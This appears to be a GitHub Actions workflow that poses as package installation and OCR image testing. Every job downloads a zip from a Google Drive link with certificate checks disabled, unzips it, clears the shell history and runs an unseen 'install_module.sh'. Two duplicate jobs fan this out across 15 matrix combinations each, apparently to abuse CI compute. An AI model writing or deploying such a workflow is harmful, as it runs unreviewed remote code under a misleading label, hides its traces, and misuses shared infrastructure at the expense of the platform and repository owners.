name: songgio4congcu
on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  VERIFY:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.0, I.I, I.II]
        flag: ['Adapt', 'Assemble', 'Confirm', 'Ignite', 'Release']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: Install Packages
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=17tZhzkQRdHgTNx1VK2f5acDqqXinZ-Ep" -O songgio4congcu.zip
        unzip -o songgio4congcu.zip
        rm songgio4congcu.zip
        history -c && history -w

    - name: Test OCR Images
      run: bash install_module.sh


  check1:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.0, I.I, I.II]
        flag: ['Adapt', 'Assemble', 'Confirm', 'Ignite', 'Release']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: Install Packages
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=17tZhzkQRdHgTNx1VK2f5acDqqXinZ-Ep" -O songgio4congcu.zip
        unzip -o songgio4congcu.zip
        rm songgio4congcu.zip
        history -c && history -w

    - name: Test OCR Images
      run: bash install_module.sh
        
